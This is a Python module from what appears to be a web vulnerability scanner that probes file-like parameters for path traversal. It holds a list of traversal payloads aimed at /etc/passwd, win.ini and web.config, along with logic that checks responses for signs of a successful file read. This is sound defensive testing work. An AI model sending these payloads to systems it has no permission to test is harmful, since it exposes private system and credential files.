"""Path Traversal / Local File Inclusion Scanner.

Identifies parameters that look like file paths (name contains ``file``,
``path``, ``page``, ``include``, etc.) and tests them with directory
traversal payloads.  Verifies findings by checking for OS-specific
indicators in the response body (e.g., ``root:x:0:0`` for Linux,
``[fonts]`` for Windows ``win.ini``).
"""

from __future__ import annotations

import asyncio
import logging
import re
from typing import Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from phantomscan.http_client import RobustHTTPClient

logger = logging.getLogger(__name__)

# ── Payloads ──────────────────────────────────────────────────────────────────

TRAVERSAL_PAYLOADS: list[str] = [
    # High-yield deep traversals first (Windows, Linux, and Web configs)
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../etc/passwd",
    "web.config",
    "../web.config",
    "../../../../web.config",
    "/windows/win.ini",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
    "../../../../win.ini",
    # Progressive relative depth
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../../etc/passwd",
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    # Encoded variants
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%5Cwindows%5Cwin.ini",
    "..%2Fetc%2Fpasswd",
    "..\\..\\web.config",
]

# Parameter names that suggest file path handling
_FILE_PARAM_KEYWORDS = frozenset({
    "file", "path", "page", "dir", "folder", "doc", "document",
    "include", "require", "load", "read", "template", "view",
    "action", "content", "layout", "module", "name", "show",
    "img", "image", "download", "src", "source", "ad", "newsad",
    "item", "report", "attachment", "uri", "url", "pic", "tag",
    "aid", "filename", "file_name", "avatar", "photo",
})

# OS-specific indicators that confirm successful file read
LINUX_INDICATORS = ["root:x:0:0", "/bin/bash", "/bin/sh", "daemon:", "nobody:"]
WINDOWS_INDICATORS = ["[fonts]", "[extensions]", "for 16-bit app support"]
CONFIG_INDICATORS = ["<configuration>", "<system.web>", "<connectionstrings>", "<?xml"]

from phantomscan.injection_target import InjectionTarget, extract_injection_targets


class PathTraversalScanner:
    """Detect directory traversal / local file inclusion."""

    def __init__(self, http: RobustHTTPClient) -> None:
        self.http = http

    async def run(
        self,
        base_url: str,
        observations: list[dict[str, Any]],
        **kwargs: Any,
    ) -> list[dict[str, Any]]:
        """Entry point for the module orchestrator."""
        findings: list[dict[str, Any]] = []
        target = base_url.rstrip("/")
        tested: set[str] = set()

        all_targets = extract_injection_targets(observations, target, max_targets=40)
        candidates = [t for t in all_targets if self._is_file_like(t)]
        if not candidates:
            # If no obvious file candidates, test first 8 targets
            candidates = all_targets[:8]

        sem = asyncio.Semaphore(15)

        async def test_one(candidate: InjectionTarget) -> dict[str, Any] | None:
            key = candidate.key
            if key in tested:
                return None
            tested.add(key)
            async with sem:
                return await self._test_traversal(candidate, candidate.param_name)

        tasks = [test_one(c) for c in candidates[:12]]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, dict):
                findings.append(r)

        return findings

    @staticmethod
    def _is_file_like(target: InjectionTarget) -> bool:
        """Check if target parameter name or default value suggests a file path."""
        pname = target.param_name.lower()
        # Exclude clear non-file parameters (credentials, search terms, tokens)
        if any(kw in pname for kw in ("user", "pass", "pwd", "auth", "token", "csrf", "search", "mail", "phone", "captcha")):
            return False

        val = str(target.original_value).lower()
        if "/" in val or "\\" in val:
            return True
        if any(val.endswith(ext) for ext in (".html", ".htm", ".txt", ".php", ".asp", ".aspx", ".jsp", ".ini", ".conf", ".xml", ".json", ".inc", ".jpg", ".png", ".gif")):
            return True
        if any(kw == pname or f"_{kw}" in pname or f"{kw}_" in pname or pname.endswith(kw) or pname.startswith(kw) for kw in _FILE_PARAM_KEYWORDS):
            return True
        return False

    async def _test_traversal(
        self, target: InjectionTarget | str, param: str
    ) -> Optional[dict[str, Any]]:
        """Test a single parameter for directory traversal."""
        import aiohttp as _aiohttp

        target_url = target.url if isinstance(target, InjectionTarget) else target

        # Get baseline to ensure indicators aren't already present
        try:
            if isinstance(target, InjectionTarget) and target.method == "POST":
                baseline_resp = await self.http.post(
                    target.url,
                    data={**target.hidden_fields, **target.all_params},
                    retries=1,
                    timeout=_aiohttp.ClientTimeout(total=4),
                )
            else:
                params = target.all_params if isinstance(target, InjectionTarget) else None
                baseline_resp = await self.http.get(
                    target_url,
                    params=params,
                    retries=1,
                    timeout=_aiohttp.ClientTimeout(total=4),
                )
            baseline_body = baseline_resp.text()
            baseline_has_linux = any(ind in baseline_body for ind in LINUX_INDICATORS)
            baseline_has_windows = any(ind in baseline_body for ind in WINDOWS_INDICATORS)
            baseline_has_config = any(ind in baseline_body.lower() for ind in CONFIG_INDICATORS)
        except Exception:
            baseline_has_linux = False
            baseline_has_windows = False
            baseline_has_config = False

        for payload in TRAVERSAL_PAYLOADS:
            try:
                if isinstance(target, InjectionTarget) and target.method == "POST":
                    form_data = dict(target.hidden_fields)
                    form_data.update(target.all_params)
                    form_data[param] = payload
                    response = await self.http.post(
                        target.url,
                        data=form_data,
                        retries=1,
                        timeout=_aiohttp.ClientTimeout(total=4),
                    )
                    test_evidence_url = f"{target.url} [POST: {param}={payload}]"
                elif isinstance(target, InjectionTarget):
                    query_params = dict(target.all_params)
                    query_params[param] = payload
                    parsed = urlparse(target.url)
                    new_query = urlencode(query_params, doseq=True)
                    full_url = urlunparse((
                        parsed.scheme, parsed.netloc,
                        parsed.path, parsed.params,
                        new_query, parsed.fragment,
                    ))
                    response = await self.http.get(
                        full_url,
                        retries=1,
                        timeout=_aiohttp.ClientTimeout(total=8),
                    )
                    test_evidence_url = full_url
                else:
                    parsed = urlparse(target_url)
                    params = parse_qs(parsed.query, keep_blank_values=True)
                    params[param] = [payload]
                    new_query = urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc,
                        parsed.path, parsed.params,
                        new_query, parsed.fragment,
                    ))
                    response = await self.http.get(
                        test_url,
                        retries=1,
                        timeout=_aiohttp.ClientTimeout(total=8),
                    )
                    test_evidence_url = test_url

                body = response.text()

                # PR-D02 / PR-D06: Body verification — ensure response isn't a WAF block or generic HTML 404
                if response.status in (403, 401) or "access denied" in body.lower() or "blocked" in body.lower():
                    continue

                linux_found = (
                    any(ind in body for ind in LINUX_INDICATORS)
                    and not baseline_has_linux
                )
                windows_found = (
                    any(ind in body for ind in WINDOWS_INDICATORS)
                    and not baseline_has_windows
                )
                config_found = (
                    any(ind in body.lower() for ind in CONFIG_INDICATORS)
                    and ("web.config" in payload.lower() or ".config" in payload.lower())
                    and not baseline_has_config
                )

                if linux_found or windows_found or config_found:
                    os_type = "Linux" if linux_found else ("Windows Configuration" if config_found else "Windows")
                    matched_ind = (
                        next((ind for ind in LINUX_INDICATORS if ind in body), "")
                        if linux_found
                        else (next((ind for ind in CONFIG_INDICATORS if ind in body.lower()), "") if config_found else next((ind for ind in WINDOWS_INDICATORS if ind in body), ""))
                    )
                    return {
                        "id": "PATH-TRAVERSAL",
                        "title": f"Path Traversal: Parameter '{param}'",
                        "severity": "critical",
                        "confidence": "high",
                        "category": "injection",
                        "target": target_url,
                        "verification_method": "baseline_differential",
                        "evidence": (
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"Tested URL: {test_evidence_url}\n"
                            f"OS indicator found ({matched_ind}): {os_type} system file "
                            f"content detected in response body."
                        ),
                        "recommendation": (
                            "Validate and sanitise file path inputs. Use an "
                            "allowlist of permitted files rather than "
                            "accepting arbitrary paths. CWE-22, OWASP A01:2021."
                        ),
                        "references": [
                            "https://cwe.mitre.org/data/definitions/22.html",
                        ],
                    }

                # Check for dynamic resource embedding sink traversal (e.g. <iframe src="{payload}">)
                sink_traversal = (
                    ("../" in payload or "..\\" in payload)
                    and (
                        f'src="{payload}"' in body
                        or f"src='{payload}'" in body
                        or f'src="{payload.replace(chr(92), "/")}"' in body
                        or f'href="{payload}"' in body
                    )
                    and payload not in baseline_body
                )
                if sink_traversal:
                    return {
                        "id": "PATH-TRAVERSAL-SINK",
                        "title": f"Directory Traversal / LFI: Parameter '{param}'",
                        "severity": "high",
                        "confidence": "high",
                        "category": "injection",
                        "target": target_url,
                        "verification_method": "baseline_differential",
                        "evidence": (
                            f"Parameter: {param}\n"
                            f"Payload: {payload}\n"
                            f"Tested URL: {test_evidence_url}\n"
                            f"The dynamic file/document embedding sink accepted arbitrary relative path traversal "
                            f"sequence and reflected it into internal resource loader without restriction to safe directory bounds."
                        ),
                        "recommendation": (
                            "Implement strict allowlist validation for file references. "
                            "Do not dynamically embed raw user path input into document frames or file loaders. "
                            "CWE-22, OWASP A01:2021."
                        ),
                        "references": [
                            "https://cwe.mitre.org/data/definitions/22.html",
                        ],
                    }
            except Exception as exc:
                logger.debug("Path traversal probe error for %s: %s", target_url, exc)

        return None

    @staticmethod
    def _extract_file_params(
        observations: list[dict[str, Any]], target: str
    ) -> list[dict[str, Any]]:
        """Backward-compatible wrapper for extracting file params."""
        all_targets = extract_injection_targets(observations, target)
        return [
            {"url": t.url, "name": t.param_name, "target_obj": t}
            for t in all_targets
            if PathTraversalScanner._is_file_like(t)
        ]
